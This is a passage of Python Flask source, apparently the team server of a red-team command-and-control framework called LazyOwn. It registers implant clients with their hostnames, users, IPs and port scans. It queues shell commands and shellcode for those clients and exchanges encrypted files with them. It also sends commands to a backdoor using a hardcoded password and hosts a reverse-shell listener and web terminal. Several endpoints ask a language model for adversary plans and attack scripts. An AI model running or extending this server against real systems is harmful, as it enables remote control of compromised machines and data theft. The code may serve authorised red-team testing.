            connected_clients.add(client_id)
            print(f"New client connected: {client_id}")        
        if not data or not all(key in data for key in ['output', 'command', 'client', 'pid', 'hostname', 'ips', 'user', 'discovered_ips', 'result_portscan']):
            return jsonify({"status": "error", "message": "Invalid data format"}), 400

        output = data['output']
        client = data['client']
        pid = data['pid']
        hostname = data['hostname']
        ips = data['ips']
        user = data['user']
        discovered_ips = data['discovered_ips']
        result_portscan = data['result_portscan']
        command = data['command']


        if not all([command, output, client_id]):
            return jsonify({"status": "error", "message": "Required fields cannot be empty"}), 400

        if not isinstance(client_id, str):
            return jsonify({"status": "error", "message": "Invalid client_id type"}), 400

        sanitized_client_id = ''.join(c for c in client_id if c.isalnum() or c in '-_')
        if not sanitized_client_id or sanitized_client_id != client_id:
            return jsonify({"status": "error", "message": "Invalid client_id format"}), 400

        try:
            allowed_directory_abs = os.path.abspath(ALLOWED_DIRECTORY)
            filename = f"{sanitized_client_id}.log"
            csv_file = os.path.join(allowed_directory_abs, filename)
            csv_file_abs = os.path.abspath(csv_file)
            if not csv_file_abs.startswith(allowed_directory_abs + os.sep):
                return jsonify({"status": "error", "message": "Invalid file path"}), 403

            if not os.access(allowed_directory_abs, os.W_OK):
                return jsonify({"status": "error", "message": "Permission denied"}), 403

        except Exception as e:
            print(f"[ERROR] Path validation error: {e}")
            return jsonify({"status": "error", "message": "Path validation error"}), 500

        try:
            file_exists = os.path.isfile(csv_file_abs)
            with open(csv_file_abs, 'a', newline='') as f:
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(["client_id", "os", "pid", "hostname", "ips", "user","discovered_ips", "result_portscan", "command", "output"])

                safe_data = [
                    str(sanitized_client_id),
                    str(client)[:100],
                    str(pid)[:20],
                    str(hostname)[:100],
                    str(ips)[:100],
                    str(user)[:50],
                    str(discovered_ips)[:1000],
                    str(result_portscan)[:1000],
                    str(command)[:500],
                    str(output)[:1000]
                ]
                writer.writerow(safe_data)

            results[sanitized_client_id] = {
                "output": output,
                "client": client,
                "pid": pid,
                "hostname": hostname,
                "ips": ips,
                "user": user,
                "discovered_ips": discovered_ips,
                "result_portscan": result_portscan,
                "command": command
            }

            logging.info(f"Received output from {sanitized_client_id}: {output[:100]} Platform: {client}")
            connected_clients.add(sanitized_client_id)
            logging.info(f"Client {sanitized_client_id} registered as connected")
            return jsonify({"status": "success", "Platform": client}), 200

        except IOError as e:
            print(f"[ERROR] File operation error: {e}")
            return jsonify({"status": "error", "message": "File operation error"}), 500

    except json.JSONDecodeError:
        print(f"[ERROR] Invalid JSON received")
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


@app.route('/issue_command', methods=['POST'])
def issue_command():
    client_id = request.form['client_id']
    command = request.form['command']

    commands[client_id] = command
    if client_id not in commands_history:
        commands_history[client_id] = []
    commands_history[client_id].append(command)

    return redirect(url_for('index'))

@app.route('/upload', methods=['GET', 'POST'])
@app.route(f'{route_maleable}/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        # Opción 1: Subida normal con formulario HTML
        if 'file' in request.files:
            file = request.files['file']
            if file.filename == '':
                return jsonify({"status": "error", "message": "Empty filename"}), 400
            filename = secure_filename(file.filename)
            file.save(os.path.join(UPLOAD_FOLDER, filename))
            return jsonify({"status": "success", "message": f"File {filename} uploaded"}), 200

        # Opción 2: Datos binarios (por ejemplo, archivo cifrado)
        else:
            encrypted_data = request.get_data()
            if not encrypted_data:
                return jsonify({"status": "error", "message": "No data received"}), 400

            # Usa un nombre genérico si no hay X-Filename
            filename = secure_filename("archivo_recibido.bin")

            decrypted_data = decrypt_data(encrypted_data, True)

            with open(os.path.join(UPLOAD_FOLDER, filename), 'wb') as f:
                f.write(decrypted_data)

            return jsonify({
                "status": "success",
                "message": "File uploaded without header",
                "filename": filename
            }), 200

    # Formulario básico para pruebas
    return '''
    <!doctype html>
    <title>Upload File</title>
    <h1>Upload a File</h1>
    <form method="POST" enctype="multipart/form-data">
      <input type="file" name="file">
      <input type="submit" value="Upload">
    </form>
    '''

@app.route('/download_file', methods=['POST'])
@app.route(f'{route_maleable}download_file', methods=['POST'])
def download_file():
    client_id = request.form['client_id']
    file = request.files['file']
    if file:
        temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
        os.makedirs(temp_dir, exist_ok=True)
        file_path = os.path.join(temp_dir, file.filename)
        file.save(file_path)
        commands[client_id] = f"download:{file.filename}"

        return redirect(url_for('index'))
    else:
        return jsonify({"status": "error", "message": "No file selected"}), 400

import os
from flask import Flask, Response, jsonify

@app.route('/download/<path:file_path>', methods=['GET'])
@app.route(f'{route_maleable}download/<path:file_path>', methods=['GET'])
def serve_file(file_path):
    temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
    
    # Construir la ruta completa del archivo solicitado
    requested_path = os.path.join(temp_dir, file_path)
    
    # Normalizar las rutas para evitar intentos de path traversal
    normalized_temp_dir = os.path.normpath(temp_dir)
    normalized_requested_path = os.path.normpath(requested_path)

    # Verificar que la ruta solicitada esté dentro del directorio permitido
    if not normalized_requested_path.startswith(normalized_temp_dir + os.sep):
        return jsonify({"status": "error", "message": "Access denied"}), 403

    if os.path.exists(normalized_requested_path):
        try:
            with open(normalized_requested_path, 'rb') as f:
                file_data = f.read()
            encrypted_data = encrypt_data(file_data)
            return Response(
                encrypted_data,
                mimetype='application/octet-stream',
                headers={'Content-Disposition': f'attachment; filename="{file_path}"'}
            )
        except Exception as e:
            return str(e), 500
    else:
        return jsonify({"status": "error", "message": "File not found"}), 404



@app.route('/view_yaml', methods=['POST'])
@requires_auth
def view_yaml():
    response = decoy()
    if response:
        return response    
    selected_directory = request.form.get('directory')
    if not selected_directory:
        return redirect(url_for('index'))

    yaml_data = []

    selected_path = os.path.join(atomic_framework_path, selected_directory)

    for root, dirs, files in os.walk(selected_path):
        for file in files:
            if file.endswith('.yaml'):
                yaml_file_path = os.path.join(root, file)
                with open(yaml_file_path, 'r') as file:
                    data = yaml.safe_load(file)
                    for test in data.get('atomic_tests', []):
                        yaml_data.append({
                            'auto_generated_guid': test.get('auto_generated_guid'),
                            'name': escape_js_string(test.get('name')),
                            'description': escape_js_string(test.get('description').replace('\n','<br>')),
                            'supported_platforms': test.get('supported_platforms')
                        })

    return render_template('yaml_view.html', yaml_data=yaml_data, directory=selected_directory)



@app.route('/api/run', methods=['POST'])
@requires_auth
def run_command():
    
    data = request.json
    command = data.get('command')

    if not command:
        return jsonify({"error": "No command provided"}), 400

    output = shell.one_cmd(command)
    print(f"[INFO]{output}")

    print(f"[INFO] Type of output: {type(output)}")

    if isinstance(output, str):
        serializable_output = output
    elif isinstance(output, (int, float, bool, type(None))):
        serializable_output = str(output)
    elif isinstance(output, (list, dict)):
        serializable_output = output
    else:

        try:
            serializable_output = vars(output)
        except TypeError:
            serializable_output = str(output)

    return jsonify({"result": serializable_output}), 200

@app.route('/api/output', methods=['GET'])
def get_output():
    global shell
    output = shell.output

    print(f"[INFO] Type of output: {type(output)}")

    if isinstance(output, str):
        serializable_output = output
    elif isinstance(output, (int, float, bool, type(None))):
        serializable_output = str(output)
    elif isinstance(output, (list, dict)):
        serializable_output = output
    else:

        try:
            serializable_output = vars(output)
        except TypeError:
            serializable_output = str(output)

    return jsonify({"output": serializable_output})

@app.route('/run_shellcode', methods=['POST'])
@requires_auth
def run_shellcode():
    client_id = request.form['client_id']
    shellcode = request.form['shellcode']
    commands[client_id] = f"sc:{shellcode}"
    return redirect(url_for('index'))

@app.route('/get_results', methods=['GET'])
@requires_auth
def get_results():
    return jsonify(results)

@app.route('/lazyos/<ip>/<port>', methods=['POST'])
def send_lcommand(ip, port):
    try:
        command = request.json.get('command')
        password = "grisiscomebacksayknokknok"
        if not command:
            return jsonify({"error": "No command provided"}), 400

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, int(port)))
            s.sendall(password.encode())
            response = s.recv(1024).decode()
            s.sendall(command.encode())
            response = s.recv(1024).decode()

        return jsonify({"response": response})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/chatbot', methods=['POST'])
def chatbot():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/vuln', methods=['POST'])
def vuln():
    global events
    data = request.json
    file = f"{path}/sessions/vulns_{rhost}.nmap"
    debug = data.get('debug', True)
    event_view = data.get('event_view', "")
    
    event_config = load_event_config()
    
    print(events)    
    
    response = {
        "events": events
    }

    for event in event_config["events"]:
        event_key = event["name"]
        src_path = event["src_path"].format(BASE_DIR=BASE_DIR, rhost=rhost)
        size = event["size"]
        if event_view == event_key:
            current_src_path = src_path
        else:
            current_src_path = ""
    logging.info(event_view)
    logging.info(current_src_path)
    if not file:
        return jsonify({"error": "run lazynmap before"}), 400

    
    response = process_prompt_vuln(client, file, debug, event_view)
    with open(f"{BASE_DIR}/plan.txt", 'w') as f:
       f.write(response)
       f.close()
    shell.onecmd('create_session_json')
    return jsonify({"response": response})

@app.route('/taskbot', methods=['POST'])
def taskbot():
    data = request.json
    file = f"{path}/sessions/tasks.json"
    debug = data.get('debug', True)
    if not file:
        return jsonify({"error": "El file es requerido"}), 400
    response = process_prompt_task(client, file, debug)

    return jsonify({"response": response})

@app.route('/search', methods=['POST'])
def search():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt_search(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/script', methods=['POST'])
def script():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt_script(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/redop', methods=['POST'])
def redop():
    data = request.json
    file = f"{path}/sessions/sessionLazyOwn.json"
    debug = data.get('debug', True)
    if not file:
        return jsonify({"error": "El file es requerido"}), 400
    response = process_prompt_redop(client, file, debug)
    with open(f"{BASE_DIR}/status_redop.txt", 'w') as f:
       f.write(response)
       f.close()
    shell.onecmd('create_session_json')
    return jsonify({"response": response})

@app.route('/adversary', methods=['POST'])
def adversary():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt_adversary(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/generalbot', methods=['POST'])
def generalbot():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt_general(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/csv_to_html', methods=['POST'])
def csv_to_html():
    response = decoy()
    if response:
        return response
    file_path = request.json.get('file_path')
    if not file_path:
        return jsonify({"error": "No file path provided"}), 400

    path = os.getcwd()
    sessions = f"{path}/sessions/"
    file_path = sessions + secure_filename(file_path)

    sanitized_file_path = os.path.normpath(file_path)
    sanitized_file_path = os.path.realpath(sanitized_file_path)

    
    allowed_directory_realpath = os.path.realpath(ALLOWED_DIRECTORY)
    if not sanitized_file_path.startswith(allowed_directory_realpath):
        return jsonify({"error": "Invalid file path"}), 403

    
    relative_path = os.path.relpath(sanitized_file_path, allowed_directory_realpath)
    
    if '..' in relative_path or relative_path.startswith('/'):
        return jsonify({"error": "Invalid file path"}), 403
    
    full_path = os.path.join(allowed_directory_realpath, relative_path)
    

    
    try:
        with open(full_path, 'r') as file:
            reader = csv.reader(file)
            headers = next(reader)
            rows = list(reader)

            html = '<table border="1"><tr>'
            html += ''.join(f'<th>{header}</th>' for header in headers)
            html += '</tr>'

            for row in rows:
                html += '<tr>'
                html += ''.join(f'<td>{cell}</td>' for cell in row)
                html += '</tr>'

            html += '</table>'

            return html

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/search_results', methods=['POST'])
def search_results():
    response = decoy()
    if response:
        return response    
    term = request.form.get('input')
    md_content = search_database(term,"parquets/techniques.parquet")
    html_content = markdown.markdown(md_content)
    md_content_d = search_database(term,"parquets/detalles.parquet")
    html_content2 = markdown.markdown(md_content_d)
    md_content_b = search_database(term,"parquets/binarios.parquet")
    html_content3 = markdown.markdown(md_content_b)
    headers_content = render_template('header2.html')
    footer = render_template('footer.html')
    return render_template_string(headers_content + html_content+html_content2+html_content3+footer )

@app.route('/graph')
def graph():
    response = decoy()
    if response:
        return response    
    return render_template('graph.html')

@app.route('/task/<int:task_id>')
def task(task_id):
    response = decoy()
    if response:
        return response    
    tasks = load_tasks()
    task = next((t for t in tasks if t['id'] == task_id), None)
    if not task:
        flash('Task not found!', 'danger')
        return redirect(url_for('index'))
    task_description = markdown.markdown(task['description'])
    return render_template('task.html', task=task, task_description=task_description)

@app.route('/gettasks', methods=['GET'])
def get_tasks():
    response = decoy()
    if response:
        return response    
    tasks = load_tasks()
    return jsonify(tasks)
    
@app.route('/tasks', methods=['GET'])
def tasks():
    response = decoy()
    if response:
        return response    
    tasks = load_tasks()
    return render_template('tasks.html', tasks=tasks)
    
@app.route('/task/<int:task_id>/edit', methods=['GET', 'POST'])
def edit_task(task_id):
    response = decoy()
    if response:
        return response    
    tasks = load_tasks()
    task = next((t for t in tasks if t['id'] == task_id), None)
    if not task:
        flash('Task not found!', 'danger')
        return redirect(url_for('index'))

    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        status = request.form['status']
        valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]

        if status not in valid_statuses:
            return "Invalid status selected!", 400
        task['title'] = title
        task['description'] = description
        task['operator'] = operator
        task['status'] = status

        save_tasks(tasks)
        flash('Task updated successfully!', 'success')
        return redirect(url_for('task', task_id=task_id))

    task_description = markdown.markdown(task['description'])
    return render_template('edit_task.html', task=task, task_description=task_description)

    
@app.route('/cves', methods=['GET', 'POST'])
def cves():
    response = decoy()
    cves = load_cves()
    if response:
        return response
    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        risk = request.form['risk']
        valid_statuses = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFORMATIONAL"]

        if risk not in valid_statuses:
            return "Invalid Risk selected!", 400
        
        new_cve = {
            'id': len(cves),
            'title': title,
            'description': description,
            'operator': operator,
            'risk': risk
        }
        cves.append(new_cve)
        save_cves(cves)
        flash('Task created successfully!', 'success')
        return redirect(url_for('index'))

    return render_template('cves.html', cves=cves)

@app.route('/cve/<int:cve_id>')
def cve(cve_id):
    response = decoy()
    if response:
        return response    
    cves = load_cves()
    cve = next((t for t in cves if t['id'] == cve_id), None)
    if not cve:
        flash('CVE not found!', 'danger')
        return redirect(url_for('index'))
    cve_description = markdown.markdown(cve['description'])
    return render_template('cve.html', cve=cve, cve_description=cve_description)

@app.route('/cve/<int:cve_id>/edit', methods=['GET', 'POST'])
def edit_cve(cve_id):
    response = decoy()
    if response:
        return response    
    cves = load_cves()
    cve = next((t for t in cves if t['id'] == cve_id), None)
    if not cve:
        flash('Task not found!', 'danger')
        return redirect(url_for('index'))

    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        status = request.form['status']
        valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]

        if status not in valid_statuses:
            return "Invalid status selected!", 400
        cve['title'] = title
        cve['description'] = description
        cve['operator'] = operator
        cve['status'] = status

        save_cves(cves)
        flash('Task updated successfully!', 'success')
        return redirect(url_for('cve', cve_id=cve_id))

    cve_description = markdown.markdown(cve['description'])
    return render_template('edit_cve.html', cve=cve, cve_description=cve_description)


@app.route('/notes', methods=['GET', 'POST'])
def edit_notes():
    response = decoy()
    if response:
        return response    
    if request.method == 'POST':
        content = str(request.form['content'])
        notes = content
        save_note(notes)
        flash('Notes updated successfully!', 'success')
        shell.onecmd('create_session_json')
        return redirect(url_for('view_note'))

    notes = load_note()
    return render_template('edit_note.html', note=notes)

@app.route('/getnotes', methods=['GET'])
def get_notes():
    response = decoy()
    if response:
        return response    
    notes = load_note()
    return jsonify(notes)

@app.route('/view_note')
def view_note():
    response = decoy()
    if response:
        return response    
    note = load_note()
    return render_template('view_note.html', note=note)

@app.route('/push_notification', methods=['POST'])
def push_notification():
    html_content = request.form.get('html')
    if not html_content:
        return jsonify({"error": "HTML content is required"}), 400
    notifications = load_notifications()
    notifications.append({"html": html_content})
    JSON_FILE_PATH = "sessions/notifications.json"
    with open(JSON_FILE_PATH, 'w') as f:
        json.dump(notifications, f, indent=4)

    return jsonify({"message": "Notification saved successfully"}), 200


@app.route('/edit_event/<event_name>', methods=['GET', 'POST'])
def edit_event(event_name):
    response = decoy()
    if response:
        return response    
    event_config = load_event_config()

    event = next((e for e in event_config["events"] if e["name"] == event_name), None)

    if not event:
        return "Event not found", 404

    if request.method == 'POST':
        # Actualizar los datos del evento con los datos del formulario
        event.update({
            "name": request.form["title"],
            "src_path": request.form["src_path"],
            "size": int(request.form["size"]),
            "description": request.form["description"],
            "outputtype": request.form["outputtype"],
            "outputtodelete": request.form["outputtodelete"],
            "prompt": request.form["prompt"],
            "operator": request.form["operator"],
            "status": request.form["status"]
        })
        # Guardar los cambios en el archivo JSON
        with open('event_config.json', 'w') as f:
            json.dump(event_config, f, indent=4)
        return redirect(url_for('get_event_config_view'))

    return render_template('edit_event.html', event=event)

@app.route('/event_config', methods=['GET'])
def get_event_config():
    event_config = load_event_config()
    return jsonify(event_config)

@app.route('/event_config_view', methods=['GET', 'POST'])
def get_event_config_view():
    response = decoy()
    if response:
        return response    
    if request.method == 'POST':
        event = {
            "name": request.form.get("title"),
            "src_path": request.form.get("src_path"),
            "size": int(request.form.get("size", 0)),
            "description": request.form.get("description"),
            "outputtype": request.form.get("outputtype"),
            "outputtodelete": request.form.get("outputtodelete"),
            "prompt": request.form["prompt"],
            "operator": request.form.get("operator"),
            "status": request.form.get("status")
        }

        event_config = load_event_config()

        # Ensure event_config has the correct structure
        if "events" not in event_config:
            event_config["events"] = []

        event_config["events"].append(event)

        with open('event_config.json', 'w') as f:
            json.dump(event_config, f, indent=4)

        return redirect(url_for('get_event_config_view'))

    event_config = load_event_config()
    return render_template('event_config_view.html', event_config=event_config)

@app.route('/aicmd', methods=['GET'])
def aicmd_view():
    cmd = request.args.get('arg')

    INVALID = "Unknown command"
    
    if cmd == "1":
        command = "ping"
    elif cmd == "2":
        command = "gospider ssl"
    else:
        command = INVALID
    
    if command != INVALID:
        response = aicmd_deepseek(command)

        return jsonify(response)
    else:
        return jsonify({"error": "Arg not allowed"}), 400

@app.route('/events', methods=['GET'])
def get_events():
    client_ip = request.remote_addr
    if current_user.is_authenticated:
        print(f"Autenticated. Wellcome {client_ip}") 
    else:
        print("Unautenticated.")
        return redirect(url_for('login'))    
    global events
    event_config = load_event_config()
    response = {
        "events": events
    }
    global BASE_DIR

    for event in event_config["events"]:
        response[event["name"]] = {"exist": False}

    for event in event_config["events"]:
        event_key = event["name"]
        src_path = event["src_path"].format(BASE_DIR=BASE_DIR, rhost=rhost)
        size = event["size"]

        matching_events = [
            e for e in events
            if e["src_path"] == src_path and e["size"] > size
        ]

        if matching_events:
            response[event_key]["exist"] = True

    return jsonify(response)


@app.route('/tools', methods=['GET'])
def list_tools():
    response = decoy()
    if response:
        return response    
    tools = [f for f in os.listdir(TOOLS_DIR) if f.endswith('.tool')]
    return render_template('list_tools.html', tools=tools)


@app.route('/tools/create', methods=['GET', 'POST'])
def create_tool():
    response = decoy()
    config = load_payload()
    if response:
        return response
    if request.method == 'POST':
        toolname = request.form['toolname']
        command = request.form['command']
        trigger = request.form.getlist('trigger')
        active = request.form.get('active') == 'true'
        securetoolname = secure_filename(toolname)
        for key, value in config.items():
            command = command.replace(f'{{{str(key)}}}', str(value))

        tool_data = {
            "toolname": securetoolname,
            "command": command,
            "trigger": trigger,
            "active": active
        }
        
        tool_path = os.path.join(TOOLS_DIR, f'{securetoolname}.tool')
        with open(tool_path, 'w') as file:
            json.dump(tool_data, file, indent=4)

        return redirect(url_for('list_tools'))

    return render_template('create_tool.html', config=config, current_user=current_user)

@app.route('/tools/<toolname>', methods=['GET'])
def view_tool(toolname):
    response = decoy()
    if response:
        return response    
    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path_safe = os.path.join(TOOLS_DIR, filename)
            with open(tool_path_safe, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
                tools.append(tool_data)

    valid_tool = None
    for tool in tools:
        if toolname == tool['filename'].replace('.tool', ''):
            valid_tool = tool
            break

    if not valid_tool:
        abort(404, description="Herramienta no encontrada o no válida")

    tool_path = os.path.join(TOOLS_DIR, tool['filename'])    

    with open(tool_path, 'r') as file:
        tool_data = json.load(file)
    return render_template('view_tool.html', tool=tool_data)

@app.route('/tools/<toolname>/update', methods=['GET', 'POST'])
def update_tool(toolname):
    response = decoy()
    config = load_payload()
    if response:
        return response
    
    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path_safe = os.path.join(TOOLS_DIR, filename)
            with open(tool_path_safe, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
                tools.append(tool_data)

    valid_tool = None
    for tool in tools:
        if toolname == tool['filename'].replace('.tool', ''):
            valid_tool = tool
            break

    if not valid_tool:
        abort(404, description="Herramienta no encontrada o no válida")

    tool_path = os.path.join(TOOLS_DIR, tool['filename'])
    if request.method == 'POST':
        command = request.form['command']
        trigger = request.form.getlist('trigger')
        active = request.form.get('active') == 'true'
        
        for key, value in config.items():
            command = command.replace(f'{{{str(key)}}}', str(value))

        tool_data = {
            "toolname": toolname,
            "command": command,
            "trigger": trigger,
            "active": active
        }

        with open(tool_path, 'w') as file:
            json.dump(tool_data, file, indent=4)

        return redirect(url_for('list_tools'))

    with open(tool_path, 'r') as file:
        tool_data = json.load(file)

    return render_template('edit_tool.html', tool=tool_data, config=config)

@app.route('/tools/<toolname>/delete', methods=['POST'])
def delete_tool(toolname):
    response = decoy()
    if response:
        return response

    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path_safe = os.path.join(TOOLS_DIR, filename)
            with open(tool_path_safe, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
                tools.append(tool_data)

    valid_tool = None
    for tool in tools:
        if toolname == tool['filename'].replace('.tool', ''):
            valid_tool = tool
            break

    if not valid_tool:
        abort(404, description="Herramienta no encontrada o no válida")

   
    tool_path = os.path.join(TOOLS_DIR, valid_tool['filename'])

    try:
        os.remove(tool_path)
    except OSError as e:
        return f"Error al eliminar el archivo: {e}", 500

    return redirect(url_for('list_tools'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    response = decoy()
    if response:
        return response    
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        if not username or not password:
            flash('Uername and password is mandatory.', 'error')
            return redirect(url_for('register'))

        if len(password) < 8:
            flash('Password at least 8 chars.', 'error')
            return redirect(url_for('register'))

        users = load_users()

        if any(user['username'] == username for user in users):
            flash('Username Exist.', 'error')
            return redirect(url_for('register'))
        new_user = {
            'id': len(users) + 1,
            'username': username,
            'password_hash': generate_password_hash(password),
            'elo': 0
        }
        users.append(new_user)
        save_users(users)

        flash('Success, Please Login.', 'success')
        return redirect(url_for('login'))

    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    response = decoy()
    if response:
        return response    
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        users = load_users()
        user_data = next((user for user in users if user['username'] == username), None)

        if user_data and check_password_hash(user_data['password_hash'], password):
            user = User(user_data)
            login_user(user)
            flash('Wellcome to LazyOwn .', 'success')
            return redirect(url_for('profile'))
        else:
            flash('Error Login incorrect .', 'error')

    return render_template('login.html')

@app.route('/profile')
@login_required
def profile():
    response = decoy()
    if response:
        return response    
    karma_name = get_karma_name(current_user.elo)
    return render_template('profile.html', user=current_user, karma_name=karma_name)

@app.route('/logout')
@login_required
def logout():
    response = decoy()
    if response:
        return response    
    logout_user()
    flash('Successfully Logout...', 'success')
    return redirect(url_for('index'))

@app.route('/aumentar_elo/<int:user_id>', methods=['POST'])
def aumentar_elo_route(user_id):
    response = decoy()
    if response:
        return response    
    data = request.get_json()
    cantidad = data.get('cantidad', 0)

    if cantidad <= 0:
        return jsonify({"error": "Error elo must be abs."}), 400

    aumentar_elo(user_id, cantidad)
    return jsonify({"message": f"The Elo {user_id} increased in {cantidad} points."}), 200

@app.route('/banners')
def banners():
    response = decoy()
    if response:
        return response    
    banners_json = load_banners()
    if not banners_json:
        return render_template('banners.html', title="Target's Information", content="No banners found.")
    html_table = '<table class="table table-dark table-striped">\n'
    html_table += '  <thead>\n'
    html_table += '    <tr>\n'
    html_table += '      <th>Hostname</th>\n'
    html_table += '      <th>Port</th>\n'
    html_table += '      <th>Protocol</th>\n'
    html_table += '      <th>Extra</th>\n'
    html_table += '      <th>Service</th>\n'
    html_table += '    </tr>\n'
    html_table += '  </thead>\n'
    html_table += '  <tbody>\n'

    for banner in banners_json:
        html_table += '    <tr>\n'
        html_table += f'      <td>{banner["hostname"]}</td>\n'
        html_table += f'      <td>{banner["port"]}</td>\n'
        html_table += f'      <td>{banner["protocol"]}</td>\n'
        html_table += f'      <td>{banner["extra"]}</td>\n'
        html_table += f'      <td>{banner["service"]}</td>\n'
        html_table += '    </tr>\n'

    html_table += '  </tbody>\n'
    html_table += '</table>'

    return render_template('banners.html', title="Target's Information", content=html_table)



@app.route('/mitre')
def mitre():
    response = decoy()
    if response:
        return response        
    page_arg = request.args.get('page', '1')
    page = int(re.sub(r'\D', '', page_arg) or '1')
    per_page = 10

    mitre_data = load_mitre_data()
    tactics = [t for t in mitre_data['objects'] if t['type'] == 'x-mitre-tactic']
    techniques = [t for t in mitre_data['objects'] if t['type'] == 'attack-pattern']

    total = len(techniques)
    pages = ceil(total / per_page)
    start = (page - 1) * per_page
    end = start + per_page

    paginated_techniques = techniques[start:end]

    return render_template('mitre.html', title="MITRE ATT&CK Techniques", tactics=tactics, techniques=paginated_techniques, page=page, pages=pages)

@app.route('/get_connected_clients', methods=['GET'])
def get_connected_clients():
    response = decoy()
    if response:
        return response
    global connected_clients
    connected_clients_list = list(connected_clients)
    return jsonify({"connected_clients": connected_clients_list})

@app.route('/lazybot', methods=['POST'])
def lazybot():
    data = request.json
    prompt = data.get('prompt')

    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    if not isinstance(prompt, str):
        prompt = str(prompt)

    response = process_prompt_local(prompt, False, "web")
    return response

@app.route('/lazyreport', methods=['POST'])
def lazyreport():
    if not request.is_json:
        return jsonify({"error": "Content-Type must be application/json"}), 400

    data = request.json
    prompt = data.get('prompt')

    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    if not isinstance(prompt, str):
        prompt = str(prompt)

    response = process_prompt_localreport(prompt, False, "web")
    return response

@app.route('/teamserver', methods=['GET', 'POST'])
def teamserver():
    if request.method == 'POST':
        form_data = {
            'assessment_information': request.form['assessment_information'],
            'engagement_overview': request.form['engagement_overview'],
            'service_description': request.form['service_description'],
            'campaign_objectives': request.form['campaign_objectives'],
            'process_and_methodology': request.form['process_and_methodology'],
            'scoping_and_rules': request.form['scoping_and_rules'],
            'executive_summary_findings': request.form['executive_summary_findings'],
            'executive_summary_narrative': request.form['executive_summary_narrative'],
            'summary_vulnerability_overview': request.form['summary_vulnerability_overview'],
            'security_labs_toolkit': request.form['security_labs_toolkit'],
            'appendix_a_changes': request.form['appendix_a_changes']
        }
        with open(JSON_FILE_PATH_REPORT, 'w') as json_file:
            json.dump(form_data, json_file)

        return render_template('teamserver.html', form_data=form_data)

    else:
        with open(JSON_FILE_PATH_REPORT, 'r') as json_file:
            form_data = json.load(json_file)

        return render_template('teamserver.html', form_data=form_data)

@app.route('/report', methods=['GET'])
def report():
    json_path = f"sessions/sessionLazyOwn.json"
    with open(JSON_FILE_PATH_REPORT, 'r') as json_file:
        report_data = json.load(json_file)
    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path = os.path.join(TOOLS_DIR, filename)
            with open(tool_path, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
                tools.append(tool_data)
    tasks = load_tasks()
    cves = load_cves()
    with open(json_path, 'r') as f:
        session_data = json.load(f)

    
    if isinstance(session_data, list):
        session_data = session_data[0] if session_data else {}

    session_data['params'] = make_serializable(session_data.get('params', {}))
    session_data['params']['api_key'] = 'Hidden conntent'
    implants_check()
    return render_template('report.html', report_data=report_data, tools=tools, tasks=tasks, cves=cves, session_data=session_data, implants=implants)

@app.route('/connect')
def connect():
    return render_template('connect.html')

@app.route('/listener')
def listener():
    return f"WebSocket listener is running on port {reverse_shell_port}."

@socketio.on('connect', namespace='/listener')
def handle_connect():
    print('Client connected to /listener')
    emit('output', 'Welcome to LazyOwn RedTeam Framework: CRIMEN 👋\r\n$ ')

@socketio.on('disconnect', namespace='/listener')
def handle_disconnect():
    print('Client disconnected from /listener')

@socketio.on("pty-input", namespace="/pty")
def pty_input(data):
    """Recibe entrada del terminal web y la escribe al PTY"""
    if app.config["fd"]:
        try:
            os.write(app.config["fd"], data["input"].encode())
        except Exception as e:
            logger.error(f"Error escribiendo entrada: {e}")

@socketio.on("resize", namespace="/pty")
def resize(data):
